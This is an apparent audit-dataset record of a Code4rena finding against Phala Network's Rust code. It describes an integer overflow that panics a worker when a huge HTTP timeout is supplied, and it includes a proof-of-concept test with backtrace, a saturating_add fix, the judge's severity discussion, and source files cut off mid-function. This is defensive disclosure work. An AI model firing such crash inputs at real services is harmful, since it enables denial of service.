{
  "Title": "[M-04] An attacker can crash the cluster system by sending an HTTP request with a huge timeout",
  "Content": "\nAny user can intentionally crash a worker by sending a maliciously crafted request with a huge timeout.\nThis attack has no costs for the attacker, and it can result in a DoS of the worker/cluster system.\n\n### Proof of Concept\n\nA user can specify a timeout when doing a `batch_http_request`:\n\n```rust\n    pub fn batch_http_request(requests: Vec<HttpRequest>, timeout_ms: u64) -> ext::BatchHttpResult {\n        const MAX_CONCURRENT_REQUESTS: usize = 5;\n        if requests.len() > MAX_CONCURRENT_REQUESTS {\n            return Err(ext::HttpRequestError::TooManyRequests);\n        }\n        block_on(async move {\n            let futs = requests\n                .into_iter()\n                .map(|request| async_http_request(request, timeout_ms));\n            tokio::time::timeout(\n@>              Duration::from_millis(timeout_ms + 200),\n                futures::future::join_all(futs),\n            )\n            .await\n        })\n        .or(Err(ext::HttpRequestError::Timeout))\n    }\n```\n\n<https://github.com/code-423n4/2024-03-phala-network/blob/a01ffbe992560d8d0f17deadfb9b9a2bed38377e/phala-blockchain/crates/pink/chain-extension/src/lib.rs#L56>\n\nThe issue is that in Rust, the `+` operator can overflow when numerics bound are exceeded; this will result in a `panic` error.\n\nWhen a malicious user sends a request with a timeout greater than `u64::MAX - 200`, they will crash the worker. As this action will cost nothing to the attacker, they can simply send multiple requests to crash all the workers, which will result in a DoS of the cluster system.\n\n### Coded PoC\n\nCopy-paste the following test in `phala-blockchain/crates/pink/chain-extension/src/mock_ext.rs`:\n\n```rust\n    #[cfg(test)]\n    mod tests {\n        use crate::PinkRuntimeEnv;\n        use pink::chain_extension::{HttpRequest, PinkExtBackend};\n\n        use super::*;\n\n        #[test]\n        fn http_timeout_panics() {\n            mock_all_ext();\n            let ext = MockExtension;\n            assert_eq!(ext.address(), &AccountId32::new([0; 32]));\n            let responses = ext\n                .batch_http_request(\n                    vec![\n                        HttpRequest {\n                            method: \"GET\".into(),\n                            url: \"https://httpbin.org/get\".into(),\n                            body: Default::default(),\n                            headers: Default::default(),\n                        },\n                        HttpRequest {\n                            method: \"GET\".into(),\n                            url: \"https://httpbin.org/get\".into(),\n                            body: Default::default(),\n                            headers: Default::default(),\n                        },\n                    ],\n                    u64::MAX, //@audit this will cause an overflow\n                )\n                .unwrap()\n                .unwrap();\n            assert_eq!(responses.len(), 2);\n            for response in responses {\n                assert!(response.is_ok());\n            }\n        }\n    }\n```\n\nOutput:\n\n```sh\n    running 1 test\n    thread 'mock_ext::tests::http_timeout_panics' panicked at crates/pink/chain-extension/src/lib.rs:66:35:\n    attempt to add with overflow\n    stack backtrace:\n       0: std::panicking::begin_panic_handler\n                 at /rustc/82e1608dfa6e0b5569232559e3d385fea5a93112/library/std/src/panicking.rs:645\n       1: core::panicking::panic_fmt\n                 at /rustc/82e1608dfa6e0b5569232559e3d385fea5a93112/library/core/src/panicking.rs:72\n       2: core::panicking::panic\n                 at /rustc/82e1608dfa6e0b5569232559e3d385fea5a93112/library/core/src/panicking.rs:127\n       3: pink_chain_extension::batch_http_request::async_block$0\n                 at ./src/lib.rs:66\n       4: tokio::runtime::park::impl$4::block_on::closure$0<enum2$<pink_chain_extension::batch_http_request::async_block_env$0> >\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/park.rs:282\n       5: tokio::runtime::coop::with_budget\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/coop.rs:107\n       6: tokio::runtime::coop::budget\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/coop.rs:73\n       7: tokio::runtime::park::CachedParkThread::block_on<enum2$<pink_chain_extension::batch_http_request::async_block_env$0> >\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/park.rs:282\n       8: tokio::runtime::context::blocking::BlockingRegionGuard::block_on<enum2$<pink_chain_extension::batch_http_request::async_block_env$0> >\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/context/blocking.rs:66\n       9: tokio::runtime::scheduler::multi_thread::impl$0::block_on::closure$0<enum2$<pink_chain_extension::batch_http_request::async_block_env$0> >\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/scheduler/multi_thread/mod.rs:87\n      10: tokio::runtime::context::runtime::enter_runtime<tokio::runtime::scheduler::multi_thread::impl$0::block_on::closure_env$0<enum2$<pink_chain_extension::batch_http_request::async_block_env$0> >,enum2$<core::result::Result<alloc::vec::Vec<enum2$<core::result:\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/context/runtime.rs:65\n      11: tokio::runtime::scheduler::multi_thread::MultiThread::block_on<enum2$<pink_chain_extension::batch_http_request::async_block_env$0> >\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/scheduler/multi_thread/mod.rs:86\n      12: tokio::runtime::runtime::Runtime::block_on<enum2$<pink_chain_extension::batch_http_request::async_block_env$0> >\n                 at /.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.35.1/src/runtime/runtime.rs:350\n      13: pink_chain_extension::block_on<enum2$<pink_chain_extension::batch_http_request::async_block_env$0> >\n                 at ./src/lib.rs:50\n      14: pink_chain_extension::batch_http_request\n                 at ./src/lib.rs:61\n      15: pink_chain_extension::impl$1::batch_http_request<pink_chain_extension::mock_ext::MockExtension,alloc::string::String>\n                 at ./src/lib.rs:192\n      16: pink_chain_extension::mock_ext::impl$1::batch_http_request\n                 at ./src/mock_ext.rs:36\n      17: pink_chain_extension::mock_ext::tests::http_timeout_panics\n                 at ./src/mock_ext.rs:198\n      18: pink_chain_extension::mock_ext::tests::http_timeout_panics::closure$0\n                 at ./src/mock_ext.rs:194\n      19: core::ops::function::FnOnce::call_once<pink_chain_extension::mock_ext::tests::http_timeout_panics::closure_env$0,tuple$<> >\n                 at /rustc/82e1608dfa6e0b5569232559e3d385fea5a93112/library/core/src/ops/function.rs:250\n      20: core::ops::function::FnOnce::call_once\n                 at /rustc/82e1608dfa6e0b5569232559e3d385fea5a93112/library/core/src/ops/function.rs:250\n    note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\n    test mock_ext::tests::http_timeout_panics ... FAILED\n```\n\n### Recommended Mitigation Steps\n\nConsider using `saturating_add` instead:\n\n```diff\n    tokio::time::timeout(\n-        Duration::from_millis(timeout_ms + 200),\n+        Duration::from_millis(timeout_ms.saturating_add(200)),\n         futures::future::join_all(futs),\n    )\n```\n\n### Assessed type\n\nInvalid Validation\n\n**[kvinwang (Phala) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-phala-network-findings/issues/43#issuecomment-2019330170):**\n > The runtime doesn't call the implementation directly. Instead, it calls into the worker, via `ocalls` [here](https://github.com/code-423n4/2024-03-phala-network/blob/main/phala-blockchain/crates/pink/runtime/src/runtime/extension.rs#L171), and **the timeout is actually clamped in the worker side**.\n> However, the suggested change is good to have. This might be a QA or Mid Risk level report.\n\n**[Lambda (judge) commented](https://github.com/code-423n4/2024-03-phala-network-findings/issues/43#issuecomment-2023611795):**\n > Not sure about the severity here. @kvinwang - Could you point out where the clamping happens? Because in the linked code it is a normal `u64` that could potentially be set to e.g. `u64::MAX - 1` to trigger the issue.\n\n**[kvinwang (Phala) commented](https://github.com/code-423n4/2024-03-phala-network-findings/issues/43#issuecomment-2024216709):**\n>[This](https://github.com/Phala-Network/phala-blockchain/blob/16d26a5289f84a73cc60ebb2943204792b1a5eac/crates/phactory/src/contracts/pink.rs#L508) is the `OCalls` implementation in the worker, where the time remaining is less than the [MAX_QUERY_TIME](https://github.com/Phala-Network/phala-blockchain/blob/16d26a5289f84a73cc60ebb2943204792b1a5eac/crates/phactory/src/contracts/pink.rs#L318).\n\n**[Lambda (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-phala-network-findings/issues/43#issuecomment-2024682875):**\n > Great, thanks for the link. In that case, I am downgrading this to a medium. It is not directly exploitable as an attacker, but the issue itself still exists within the codebase and if a future worker would integrate it differently/without limit, it could become exploitable.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-03-phala-network",
  "Code": [
    {
      "filename": "phala-blockchain/crates/pink/chain-extension/src/lib.rs",
      "content": "use std::borrow::Cow;\nuse std::io::Write;\nuse std::{\n    fmt::Display,\n    str::FromStr,\n    time::{Duration, SystemTime},\n};\n\nuse pink::{\n    chain_extension::{\n        self as ext, HttpRequest, HttpRequestError, HttpResponse, JsCode, JsValue, PinkExtBackend,\n        SigType, StorageQuotaExceeded,\n    },\n    types::sgx::SgxQuote,\n    Balance, EcdhPublicKey, EcdsaPublicKey, EcdsaSignature, Hash,\n};\nuse reqwest::{\n    header::{HeaderMap, HeaderName, HeaderValue},\n    Method,\n};\nuse reqwest_env_proxy::EnvProxyBuilder;\nuse sp_core::{ByteArray as _, Pair};\n\npub mod local_cache;\npub mod mock_ext;\n\npub trait PinkRuntimeEnv {\n    type AccountId: AsRef<[u8]> + Display;\n\n    fn address(&self) -> &Self::AccountId;\n}\n\npub struct DefaultPinkExtension<'a, T, Error> {\n    pub env: &'a T,\n    _e: std::marker::PhantomData<Error>,\n}\n\nimpl<'a, T, E> DefaultPinkExtension<'a, T, E> {\n    pub fn new(env: &'a T) -> Self {\n        Self {\n            env,\n            _e: std::marker::PhantomData,\n        }\n    }\n}\n\nfn block_on<F: core::future::Future>(f: F) -> F::Output {\n    match tokio::runtime::Handle::try_current() {\n        Ok(handle) => handle.block_on(f),\n        Err(_) => tokio::runtime::Runtime::new()\n            .expect(\"Failed to create tokio runtime\")\n            .block_on(f),\n    }\n}\n\npub fn batch_http_request(requests: Vec<HttpRequest>, timeout_ms: u64) -> ext::BatchHttpResult {\n    const MAX_CONCURRENT_REQUESTS: usize = 5;\n    if requests.len() > MAX_CONCURRENT_REQUESTS {\n        return Err(ext::HttpRequestError::TooManyRequests);\n    }\n    block_on(async move {\n        let futs = requests\n            .into_iter()\n            .map(|request| async_http_request(request, timeout_ms));\n        tokio::time::timeout(\n            Duration::from_millis(timeout_ms + 200),\n            futures::future::join_all(futs),\n        )\n        .await\n    })\n    .or(Err(ext::HttpRequestError::Timeout))\n}\n\npub fn http_request(\n    request: HttpRequest,\n    timeout_ms: u64,\n) -> Result<HttpResponse, HttpRequestError> {\n    use HttpRequestError::*;\n    match block_on(async_http_request(request, timeout_ms)) {\n        Ok(resp) => Ok(resp),\n        Err(err) => match err {\n            // runtime v1.0 supported errors\n            InvalidUrl | InvalidMethod | InvalidHeaderName | InvalidHeaderValue\n            | FailedToCreateClient | Timeout => Err(err),\n            _ => {\n                // To be compatible with runtime v1.0, we need to convert the v1.1 extended errors\n                // to an HTTP response with status code 524.\n                log::error!(\"chain_ext: http request failed: {}\", err.display());\n                Ok(HttpResponse {\n                    status_code: 524,\n                    reason_phrase: \"IO Error\".into(),\n                    body: format!(\"{err:?}\").into_bytes(),\n                    headers: vec![],\n                })\n            }\n        },\n    }\n}\n\nasync fn async_http_request(\n    request: HttpRequest,\n    timeout_ms: u64,\n) -> Result<HttpResponse, HttpRequestError> {\n    if timeout_ms == 0 {\n        return Err(HttpRequestError::Timeout);\n    }\n    let timeout = Duration::from_millis(timeout_ms);\n    let url: reqwest::Url = request.url.parse().or(Err(HttpRequestError::InvalidUrl))?;\n    let client = reqwest::Client::builder()\n        .trust_dns(true)\n        .timeout(timeout)\n        .env_proxy(url.host_str().unwrap_or_default())\n        .build()\n        .or(Err(HttpRequestError::FailedToCreateClient))?;\n\n    let method: Method =\n        FromStr::from_str(request.method.as_str()).or(Err(HttpRequestError::InvalidMethod))?;\n    let mut headers = HeaderMap::new();\n    for (key, value) in &request.headers {\n        let key =\n            HeaderName::from_str(key.as_str()).or(Err(HttpRequestError::InvalidHeaderName))?;\n        let value = HeaderValue::from_str(value).or(Err(HttpRequestError::InvalidHeaderValue))?;\n        headers.insert(key, value);\n    }\n\n    let result = client\n        .request(method, url)\n        .headers(headers)\n        .body(request.body)\n        .send()\n        .await;\n\n    let mut response = match result {\n        Ok(response) => response,\n        Err(err) => {\n            // If there is somthing wrong with the network, we can not inspect the reason too\n            // much here. Let it return a non-standard 523 here.\n            return Ok(HttpResponse {\n                status_code: 523,\n                reason_phrase: \"Unreachable\".into(),\n                body: format!(\"{err:?}\").into_bytes(),\n                headers: vec![],\n            });\n        }\n    };\n\n    let headers: Vec<_> = response\n        .headers()\n        .iter()\n        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or_default().into()))\n        .collect();\n\n    const MAX_BODY_SIZE: usize = 1024 * 1024 * 2; // 2MB\n\n    let mut body = Vec::new();\n    let mut writer = LimitedWriter::new(&mut body, MAX_BODY_SIZE);\n\n    while let Some(chunk) = response\n        .chunk()\n        .await\n        .or(Err(HttpRequestError::NetworkError))?\n    {\n        writer\n            .write_all(&chunk)\n            .or(Err(HttpRequestError::ResponseTooLarge))?;\n    }\n\n    let response = HttpResponse {\n        status_code: response.status().as_u16(),\n        reason_phrase: response\n            .status()\n            .canonical_reason()\n            .unwrap_or_default()\n            .into(),\n        body,\n        headers,\n    };\n    Ok(response)\n}\n\nimpl<T: PinkRuntimeEnv, E: From<&'static str>> PinkExtBackend for DefaultPinkExtension<'_, T, E> {\n    type Error = E;\n    fn http_request(&self, request: HttpRequest) -> Result<HttpResponse, Self::Error> {\n        http_request(request, 10 * 1000).map_err(|err| err.display().into())\n    }\n\n    fn batch_http_request(\n        &self,\n        requests: Vec<HttpRequest>,\n        timeout_ms: u64,\n    ) -> Result<ext::BatchHttpResult, Self::Error> {\n        Ok(batch_http_request(requests, timeout_ms))\n    }\n\n    fn sign(\n        &self,\n        sigtype: SigType,\n        key: Cow<[u8]>,\n        message: Cow<[u8]>,\n    ) -> Result<Vec<u8>, Self::Error> {\n        macro_rules! sign_with {\n            ($sigtype:ident) => {{\n                let pair = sp_core::$sigtype::Pair::from_seed_slice(&key).or(Err(\"Invalid key\"))?;\n                let signature = pair.sign(&message);\n                let signature: &[u8] = signature.as_ref();\n                signature.to_vec()\n            }};\n        }\n\n        Ok(match sigtype {\n            SigType::Sr25519 => sign_with!(sr25519),\n            SigType::Ed25519 => sign_with!(ed25519),\n            SigType::Ecdsa => sign_with!(ecdsa),\n        })\n    }\n\n    fn verify(\n        &self,\n        sigtype: SigType,\n        pubkey: Cow<[u8]>,\n        message: Cow<[u8]>,\n        signature: Cow<[u8]>,\n    ) -> Result<bool, Self::Error> {\n        macro_rules! verify_with {\n            ($sigtype:ident) => {{\n                let pubkey = sp_core::$sigtype::Public::from_slice(&pubkey)\n                    .map_err(|_| \"Invalid public key\")?;\n                let signature = sp_core::$sigtype::Signature::from_slice(&signature)\n                    .ok_or(\"Invalid signature\")?;\n                Ok(sp_core::$sigtype::Pair::verify(\n                    &signature, message, &pubkey,\n                ))\n            }};\n        }\n        match sigtype {\n            SigType::Sr25519 => verify_with!(sr25519),\n            SigType::Ed25519 => verify_with!(ed25519),\n            SigType::Ecdsa => verify_with!(ecdsa),\n        }\n    }\n\n    fn derive_sr25519_key(&self, salt: Cow<[u8]>) -> Result<Vec<u8>, Self::Error> {\n        // This default implementation is for unit tests. The host should override this.\n        let mut seed: <sp_core::sr25519::Pair as Pair>::Seed = Default::default();\n        let len = seed.len().min(salt.len());\n        seed[..len].copy_from_slice(&salt[..len]);\n        let key = sp_core::sr25519::Pair::from_seed(&seed);\n\n        Ok(key.as_ref().secret.to_bytes().to_vec())\n    }\n\n    fn get_public_key(&self, sigtype: SigType, key: Cow<[u8]>) -> Result<Vec<u8>, Self::Error> {\n        macro_rules! public_key_with {\n            ($sigtype:ident) => {{\n                sp_core::$sigtype::Pair::from_seed_slice(&key)\n                    .or(Err(\"Invalid key\"))?\n                    .public()\n                    .to_raw_vec()\n            }};\n        }\n        let pubkey = match sigtype {\n            SigType::Ed25519 => public_key_with!(ed25519),\n            SigType::Sr25519 => public_key_with!(sr25519),\n            SigType::Ecdsa => public_key_with!(ecdsa),\n        };\n        Ok(pubkey)\n    }\n\n    fn cache_set(\n        &self,\n        _key: Cow<[u8]>,\n        _value: Cow<[u8]>,\n    ) -> Result<Result<(), StorageQuotaExceeded>, Self::Error> {\n        Ok(Ok(()))\n    }\n\n    fn cache_set_expiration(&self, _key: Cow<[u8]>, _expire: u64) -> Result<(), Self::Error> {\n        Ok(())\n    }\n\n    fn cache_get(&self, _key: Cow<'_, [u8]>) -> Result<Option<Vec<u8>>, Self::Error> {\n        Ok(None)\n    }\n\n    fn cache_remove(&self, _key: Cow<'_, [u8]>) -> Result<Option<Vec<u8>>, Self::Error> {\n        Ok(None)\n    }\n\n    fn log(&self, level: u8, message: Cow<str>) -> Result<(), Self::Error> {\n        let address = self.env.address();\n        let level = match level {\n            1 => log::Level::Error,\n            2 => log::Level::Warn,\n            3 => log::Level::Info,\n            4 => log::Level::Debug,\n            5 => log::Level::Trace,\n            _ => log::Level::Error,\n        };\n        log::log!(target: \"pink\", level, \"[{}] {}\", address, message);\n        Ok(())\n    }\n\n    fn getrandom(&self, length: u8) -> Result<Vec<u8>, Self::Error> {\n        let mut buf = vec![0u8; length as _];\n        getrandom::getrandom(&mut buf[..]).or(Err(\"Failed to get random bytes\"))?;\n        Ok(buf)\n    }\n\n    fn is_in_transaction(&self) -> Result<bool, Self::Error> {\n        Ok(false)\n    }\n\n    fn ecdsa_sign_prehashed(\n        &self,\n        key: Cow<[u8]>,\n        message_hash: Hash,\n    ) -> Result<EcdsaSignature, Self::Error> {\n        let pair = sp_core::ecdsa::Pair::from_seed_slice(&key).or(Err(\"Invalid key\"))?;\n        let signature = pair.sign_prehashed(&message_hash);\n        Ok(signature.0)\n    }\n\n    fn ecdsa_verify_prehashed(\n        &self,\n        signature: EcdsaSignature,\n        message_hash: Hash,\n        pubkey: EcdsaPublicKey,\n    ) -> Result<bool, Self::Error> {\n        let public = sp_core::ecdsa::Public(pubkey);\n        let sig = sp_core::ecdsa::Signature(signature);\n        Ok(sp_core::ecdsa::Pair::verify_prehashed(\n            &sig,\n            &message_hash,\n            &public,\n        ))\n    }\n\n    fn system_contract_id(&self) -> Result<ext::AccountId, Self::Error> {\n        Err(\"No default system contract id\".into())\n    }\n\n    fn balance_of(&self, _account: ext::AccountId) -> Result<(Balance, Balance), Self::Error> {\n        Ok((0, 0))\n    }\n\n    fn untrusted_millis_since_unix_epoch(&self) -> Result<u64, Self::Error> {\n        let duration = SystemTime::now()\n            .duration_since(SystemTime::UNIX_EPOCH)\n            .or(Err(\"The system time is earlier than UNIX_EPOCH\"))?;\n        Ok(duration.as_millis() as u64)\n    }\n\n    fn worker_pubkey(&self) -> Result<EcdhPublicKey, Self::Error> {\n        Ok(Default::default())\n    }\n\n    fn code_exists(&self, _code_hash: Hash, _sidevm: bool) -> Result<bool, Self::Error> {\n        Ok(false)\n    }\n\n    fn import_latest_system_code(\n        &self,\n        _payer: ext::AccountId,\n    ) -> Result<Option<Hash>, Self::Error> {\n        Ok(None)\n    }\n\n    fn runtime_version(&self) -> Result<(u32, u32), Self::Error> {\n        Ok((1, 0))\n    }\n\n    fn current_event_chain_head(&self) -> Result<(u64, Hash), Self::Error> {\n        Ok((0, Default::default()))\n    }\n\n    fn js_eval(&self, _codes: Vec<JsCode>, _args: Vec<String>) -> Result<JsValue, Self::Error> {\n        Ok(JsValue::Exception(\"No Js Runtime\".into()))\n    }\n\n    fn worker_sgx_quote(&self) -> Result<Option<SgxQuote>, Self::Error> {\n        Ok(None)\n    }\n}\n\nstruct LimitedWriter<W> {\n    writer: W,\n    written: usize,\n    limit: usize,\n}\n\nimpl<W> LimitedWriter<W> {\n    fn new(writer: W, limit: usize) -> Self {\n        Self {\n            writer,\n            written: 0,\n            limit,\n        }\n    }\n}\n\nimpl<W: std::io::Write> std::io::Write for LimitedWriter<W> {\n    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {\n        if self.written + buf.len() > self.limit {\n            return Err(std::io::Error::new(\n                std::io::ErrorKind::Other,\n                \"Buffer limit exceeded\",\n            ));\n        }\n        let wlen = self.writer.write(buf)?;\n        self.written += wlen;\n        Ok(wlen)\n    }\n\n    fn flush(&mut self) -> std::io::Result<()> {\n        self.writer.flush()\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    use pink::chain_extension::HttpRequest;\n\n    #[test]\n    fn default_impl_works() {\n        use mock_ext::MockExtension;\n        use pink::chain_extension::PinkExtBackend;\n\n        let mock = MockExtension;\n        let ext = DefaultPinkExtension::<_, String>::new(&mock);\n\n        let key = b\"key\";\n        let value = b\"value\";\n        assert!(ext\n            .cache_set(Cow::Borrowed(key), Cow::Borrowed(value))\n            .is_ok());\n        assert!(ext.cache_set_expiration(Cow::Borrowed(key), 100).is_ok());\n        assert!(ext.cache_get(Cow::Borrowed(key)).is_ok());\n        assert!(ext.cache_remove(Cow::Borrowed(key)).is_ok());\n\n        ext.log(1, \"error\".into()).unwrap();\n        ext.log(2, \"warn\".into()).unwrap();\n        ext.log(3, \"info\".into()).unwrap();\n        ext.log(4, \"debug\".into()).unwrap();\n        ext.log(5, \"trace\".into()).unwrap();\n        ext.log(6, \"unknown\".into()).unwrap();\n\n        assert!(ext.is_in_transaction().is_ok());\n        assert!(ext.system_contract_id().is_err());\n        assert!(ext.balance_of([0u8; 32].into()).is_ok());\n        assert!(ext.worker_pubkey().is_ok());\n        assert!(ext.code_exists(Default::default(), false).is_ok());\n        assert!(ext.import_latest_system_code([0u8; 32].into()).is_ok());\n        assert!(ext.runtime_version().is_ok());\n        assert!(ext.current_event_chain_head().is_ok());\n    }\n\n    #[test]\n    fn test_too_large_batch_http_req() {\n        let requests = (0..10)\n            .map(|_| HttpRequest {\n                url: \"https://www.google.com\".into(),\n                method: \"GET\".into(),\n                headers: vec![],\n                body: vec![],\n            })\n            .collect::<Vec<_>>();\n        let responses = batch_http_request(requests, 10 * 1000);\n        assert!(responses.is_err());\n    }\n\n    #[cfg(coverage)]\n    #[tokio::test]\n    async fn test_http_req() {\n        let response = tokio::task::spawn_blocking(|| {\n            http_request(\n                HttpRequest {\n                    url: \"https://httpbin.org/get\".into(),\n                    method: \"GET\".into(),\n                    headers: vec![(\"X-Foo\".to_string(), \"bar\".to_string())],\n                    body: vec![],\n                },\n                1000 * 10,\n            )\n        })\n        .await;\n        assert!(response.is_ok());\n    }\n\n    #[tokio::test]\n    async fn test_http_req_net_error() {\n        let response = tokio::task::spawn_blocking(|| {\n            http_request(\n                HttpRequest {\n                    url: \"http://127.0.0.1:54321/get\".into(),\n                    method: \"GET\".into(),\n                    headers: vec![],\n                    body: vec![],\n                },\n                1000 * 10,\n            )\n        })\n        .await;\n        assert_eq!(response.unwrap().unwrap().status_code, 523);\n    }\n\n    #[tokio::test]\n    async fn test_http_req_zero_timeout() {\n        let response = tokio::task::spawn_blocking(|| {\n            http_request(\n                HttpRequest {\n                    url: \"https://httpbin.org/get\".into(),\n                    method: \"GET\".into(),\n                    headers: vec![],\n                    body: vec![],\n                },\n                0,\n            )\n        })\n        .await;\n        assert!(response.unwrap().is_err());\n    }\n}"
    },
    {
      "filename": "phala-blockchain/crates/pink/runtime/src/runtime/extension.rs",
      "content": "use std::borrow::Cow;\n\nuse frame_support::traits::Currency;\nuse log::error;\nuse pallet_contracts::chain_extension::{\n    ChainExtension, Environment, Ext, InitState, Result as ExtResult, RetVal,\n};\nuse phala_crypto::sr25519::{Persistence, KDF};\nuse phala_types::contract::ConvertTo;\nuse pink::{\n    chain_extension::{\n        self as ext, HttpRequest, HttpResponse, JsCode, JsValue, PinkExtBackend, SigType,\n        StorageQuotaExceeded,\n    },\n    dispatch_ext_call,\n    types::sgx::SgxQuote,\n    CacheOp, EcdhPublicKey, EcdsaPublicKey, EcdsaSignature, Hash, PinkEvent,\n};\nuse pink_chain_extension::{DefaultPinkExtension, PinkRuntimeEnv};\nuse scale::{Decode, Encode};\nuse sp_runtime::{AccountId32, DispatchError};\n\nuse crate::{capi::OCallImpl, types::AccountId};\n\nuse pink_capi::{types::ExecSideEffects, v1::ocall::OCallsRo};\n\nuse super::{pallet_pink, PinkRuntime, SystemEvents};\nuse crate::runtime::Pink as PalletPink;\ntype Error = pallet_pink::Error<PinkRuntime>;\n\nfn deposit_pink_event(contract: AccountId, event: PinkEvent) {\n    let topics = [pink::PinkEvent::event_topic().into()];\n    let event = super::RuntimeEvent::Contracts(pallet_contracts::Event::ContractEmitted {\n        contract,\n        data: event.encode(),\n    });\n    super::System::deposit_event_indexed(&topics[..], event);\n}\n\npub fn get_side_effects() -> (SystemEvents, ExecSideEffects) {\n    let mut pink_events = Vec::default();\n    let mut ink_events = Vec::default();\n    let mut instantiated = Vec::default();\n    let mut system_events = vec![];\n    for event in super::System::events() {\n        let mut is_private_event = false;\n        if let super::RuntimeEvent::Contracts(ink_event) = &event.event {\n            use pallet_contracts::Event as ContractEvent;\n            match ink_event {\n                ContractEvent::Instantiated {\n                    deployer,\n                    contract: address,\n                } => instantiated.push((deployer.clone(), address.clone())),\n                ContractEvent::ContractEmitted {\n                    contract: address,\n                    data,\n                } => {\n                    if event.topics.len() == 1\n                        && event.topics[0].0 == pink::PinkEvent::event_topic()\n                    {\n                        match pink::PinkEvent::decode(&mut &data[..]) {\n                            Ok(event) => {\n                                pink_events.push((address.clone(), event.clone()));\n                                is_private_event = event.is_private();\n                            }\n                            Err(_) => {\n                                error!(\"Contract emitted an invalid pink event\");\n                            }\n                        }\n                    } else {\n                        ink_events.push((address.clone(), event.topics.clone(), data.clone()));\n                    }\n                }\n                _ => (),\n            }\n        }\n        if !is_private_event {\n            system_events.push(event);\n        }\n    }\n    (\n        system_events,\n        ExecSideEffects::V1 {\n            pink_events,\n            ink_events,\n            instantiated,\n        },\n    )\n}\n\n/// Contract extension for `pink contracts`\n#[derive(Default)]\npub struct PinkExtension;\n\nimpl ChainExtension<PinkRuntime> for PinkExtension {\n    fn call<E: Ext<T = PinkRuntime>>(\n        &mut self,\n        env: Environment<E, InitState>,\n    ) -> ExtResult<RetVal> {\n        let mut env = env.buf_in_buf_out();\n        if env.ext_id() != 0 {\n            error!(target: \"pink\", \"Unknown extension id: {:}\", env.ext_id());\n            return Err(Error::UnknownChainExtensionId.into());\n        }\n\n        let address = env.ext().address().clone();\n        let call_in_query = CallInQuery { address };\n        let mode = OCallImpl.exec_context().mode;\n        let (ret, output) = if mode.is_query() {\n            dispatch_ext_call!(env.func_id(), call_in_query, env)\n        } else {\n            let call = CallInCommand {\n                as_in_query: call_in_query,\n            };\n            dispatch_ext_call!(env.func_id(), call, env)\n        }\n        .ok_or(Error::UnknownChainExtensionFunction)\n        .map_err(|err| {\n            error!(target: \"pink\", \"Called an unregistered `func_id`: {:}\", env.func_id());\n            err\n        })?;\n        env.write(&output, false, None)\n            .or(Err(Error::ContractIoBufferOverflow))?;\n        Ok(RetVal::Converging(ret))\n    }\n\n    fn enabled() -> bool {\n        true\n    }\n}\n\nstruct CallInQuery {\n    address: AccountId,\n}\n\nimpl PinkRuntimeEnv for CallInQuery {\n    type AccountId = AccountId;\n\n    fn address(&self) -> &Self::AccountId {\n        &self.address\n    }\n}\n\nimpl CallInQuery {\n    fn ensure_system(&self) -> Result<(), DispatchError> {\n        let contract: AccountId32 = self.address.convert_to();\n        if Some(contract) != PalletPink::system_contract() {\n            return Err(DispatchError::BadOrigin);\n        }\n        Ok(())\n    }\n    fn address_bytes(&self) -> Vec<u8> {\n        let slice: &[u8] = self.address.as_ref();\n        slice.to_vec()\n    }\n}\n\nimpl PinkExtBackend for CallInQuery {\n    type Error = DispatchError;\n    fn http_request(&self, request: HttpRequest) -> Result<HttpResponse, Self::Error> {\n        OCallImpl\n            .http_request(self.address.clone(), request)\n            .map_err(|err| DispatchError::Other(err.display()))\n    }\n\n    fn batch_http_request(\n        &self,\n        requests: Vec<ext::HttpRequest>,\n        timeout_ms: u64,\n    ) -> Result<ext::BatchHttpResult, Self::Error> {\n        Ok(OCallImpl.batch_http_request(self.address.clone(), requests, timeout_ms))\n    }\n\n    fn sign(\n        &self,\n        sigtype: SigType,\n        key: Cow<[u8]>,\n        message: Cow<[u8]>,\n    ) -> Result<Vec<u8>, Self::Error> {\n        DefaultPinkExtension::new(self).sign(sigtype, key, message)\n    }\n\n    fn verify(\n        &self,\n        sigtype: SigType,\n        pubkey: Cow<[u8]>,\n        message: Cow<[u8]>,\n        signature: Cow<[u8]>,\n    ) -> Result<bool, Self::Error> {\n        DefaultPinkExtension::new(self).verify(sigtype, pubkey, message, signature)\n    }\n\n    fn derive_sr25519_key(&self, salt: Cow<[u8]>) -> Result<Vec<u8>, Self::Error> {\n        let privkey = PalletPink::key().ok_or(Error::KeySeedMissing)?;\n        let privkey = sp_core::sr25519::Pair::restore_from_secret_key(&privkey);\n        let contract_address: &[u8] = self.address.as_ref();\n        let derived_pair = privkey\n            .derive_sr25519_pair(&[contract_address, &salt, b\"keygen\"])\n            .or(Err(Error::DeriveKeyFailed))?;\n        let priviate_key = derived_pair.dump_secret_key();\n        let priviate_key: &[u8] = priviate_key.as_ref();\n        Ok(priviate_key.to_vec())\n    }\n\n    fn get_public_key(&self, sigtype: SigType, key: Cow<[u8]>) -> Result<Vec<u8>, Self::Error> {\n        DefaultPinkExtension::new(self).get_public_key(sigtype, key)\n    }\n\n    fn cache_set(\n        &self,\n        key: Cow<[u8]>,\n        value: Cow<[u8]>,\n    ) -> Result<Result<(), StorageQuotaExceeded>, Self::Error> {\n        Ok(OCallImpl.cache_set(self.address_bytes(), key.into_owned(), value.into_owned()))\n    }\n\n    fn cache_set_expiration(&self, key: Cow<[u8]>, expire: u64) -> 